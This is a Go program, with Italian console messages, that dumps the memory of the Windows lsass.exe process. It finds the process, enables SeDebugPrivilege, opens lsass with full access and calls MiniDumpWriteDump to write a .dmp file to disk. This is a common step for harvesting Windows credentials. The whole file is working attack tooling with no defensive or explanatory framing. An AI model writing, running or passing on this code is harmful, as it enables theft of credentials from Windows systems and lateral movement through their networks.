package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

func main() {
	pid := FindTarget("lsass.exe")
	
	if pid != 0 {
        fmt.Printf("Processo lsass.exe trovato, PID: %d\n", pid)
    } else {
        fmt.Println("Processo lsass.exe non trovato")
    }
	
	processId := pid
	elevateProcessToken()
	processDump(int(processId))
}


const (
    TH32CS_SNAPPROCESS = 0x00000002
    INVALID_HANDLE_VALUE = ^uintptr(0)
    MAX_PATH = 260
)

type PROCESSENTRY32 struct {
    dwSize              uint32
    cntUsage            uint32
    th32ProcessID       uint32
    th32DefaultHeapID   uintptr
    th32ModuleID        uint32
    cntThreads          uint32
    th32ParentProcessID uint32
    pcPriClassBase      int32
    dwFlags             uint32
    szExeFile           [MAX_PATH]uint16
}


var (
	kernel32 = syscall.MustLoadDLL("kernel32.dll")
    procCreateToolhelp32Snapshot = kernel32.MustFindProc("CreateToolhelp32Snapshot")
    procProcess32First = kernel32.MustFindProc("Process32FirstW")
    procProcess32Next = kernel32.MustFindProc("Process32NextW")
    procCloseHandle = kernel32.MustFindProc("CloseHandle")
    procLstrcmpi = kernel32.MustFindProc("lstrcmpiW")
)

func processDump(pid int) {
    // set up Win32 APIs
    var dbghelp = syscall.NewLazyDLL("Dbghelp.dll")
    var procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
    var kernel32 = syscall.NewLazyDLL("kernel32.dll")
    var procOpenProcess = kernel32.NewProc("OpenProcess")
    var procCreateFileW = kernel32.NewProc("CreateFileW")

    // make sure a handle on the process can be obtained
    processHandle, _, err := procOpenProcess.Call(uintptr(0xFFFF), uintptr(1), uintptr(pid))

    if processHandle != 0 {
        fmt.Println("Process Handle OK")
    } else {
        fmt.Println("Process Handle Error")
        fmt.Println(err)
        os.Exit(1)
    }

    currentDirectory, _ := os.Getwd()
    filePath := currentDirectory + "\\" + strconv.Itoa(pid) + ".dmp"

    os.Create(filePath)

    // get handle on newly created file
    path, _ := syscall.UTF16PtrFromString(filePath)
    fileHandle, _, err := procCreateFileW.Call(uintptr(unsafe.Pointer(path)), syscall.GENERIC_WRITE, syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE, 0, syscall.OPEN_EXISTING, syscall.FILE_ATTRIBUTE_NORMAL, 0)

    ret, _, err := procMiniDumpWriteDump.Call(uintptr(processHandle), uintptr(pid), uintptr(fileHandle), 0x00061907, 0, 0, 0)

    if ret != 0 {
        fmt.Println("Process memory dump successful to", filePath)
    } else {
        fmt.Println("Process memory dump not successful")
        fmt.Println(err)
        os.Remove(filePath)
    }
}



func elevateProcessToken() error {

	type Luid struct {
		lowPart  uint32 // DWORD
		highPart int32  // long
	}
	type LuidAndAttributes struct {
		luid       Luid   // LUID
		attributes uint32 // DWORD
	}

	type TokenPrivileges struct {
		privilegeCount uint32 // DWORD
		privileges     [1]LuidAndAttributes
	}

	const SeDebugPrivilege = "SeDebugPrivilege"
	const tokenAdjustPrivileges = 0x0020
	const tokenQuery = 0x0008
	var hToken uintptr


	user32 := syscall.MustLoadDLL("user32")
	defer user32.Release()

	kernel32 := syscall.MustLoadDLL("kernel32")
	defer user32.Release()

	advapi32 := syscall.MustLoadDLL("advapi32")
	defer advapi32.Release()

	GetCurrentProcess := kernel32.MustFindProc("GetCurrentProcess")
	GetLastError := kernel32.MustFindProc("GetLastError")
	OpenProdcessToken := advapi32.MustFindProc("OpenProcessToken")
	LookupPrivilegeValue := advapi32.MustFindProc("LookupPrivilegeValueW")
	AdjustTokenPrivileges := advapi32.MustFindProc("AdjustTokenPrivileges")

	currentProcess, _, _ := GetCurrentProcess.Call()

	result, _, err := OpenProdcessToken.Call(currentProcess, tokenAdjustPrivileges|tokenQuery, uintptr(unsafe.Pointer(&hToken)))
	if result != 1 {
		fmt.Println("OpenProcessToken(): ", result, " err: ", err)
		return err
	}

	var tkp TokenPrivileges

	result, _, err = LookupPrivilegeValue.Call(uintptr(0), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(SeDebugPrivilege))), uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))))
	if result != 1 {
		fmt.Println("LookupPrivilegeValue(): ", result, " err: ", err)
		return err
	}

	const SePrivilegeEnabled uint32 = 0x00000002

	tkp.privilegeCount = 1
	tkp.privileges[0].attributes = SePrivilegeEnabled

	result, _, err = AdjustTokenPrivileges.Call(hToken, 0, uintptr(unsafe.Pointer(&tkp)), 0, uintptr(0), 0)
	if result != 1 {
		fmt.Println("AdjustTokenPrivileges() ", result, " err: ", err)
		return err
	}

	result, _, _ = GetLastError.Call()
	if result != 0 {
		fmt.Println("GetLastError() ", result)
		return err
	}

	return nil
}


func FindTarget(procname string) uint32 {
    hProcSnap, _, _ := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPPROCESS), 0)
    if hProcSnap == uintptr(INVALID_HANDLE_VALUE) {
        return 0
    }
    var pe32 PROCESSENTRY32
    pe32.dwSize = uint32(unsafe.Sizeof(pe32))
    ret, _, _ := procProcess32First.Call(hProcSnap, uintptr(unsafe.Pointer(&pe32)))
    if ret == 0 {
        procCloseHandle.Call(hProcSnap)
        return 0
    }
    var pid uint32 = 0
    for {
        ret, _, _ := procProcess32Next.Call(hProcSnap, uintptr(unsafe.Pointer(&pe32)))
        if ret == 0 {
            break
        }
        ret, _, _ = procLstrcmpi.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(procname))), uintptr(unsafe.Pointer(&pe32.szExeFile[0])))
        if ret == 0 {
            pid = pe32.th32ProcessID
            break
        }
    }
    procCloseHandle.Call(hProcSnap)
    return pid
}

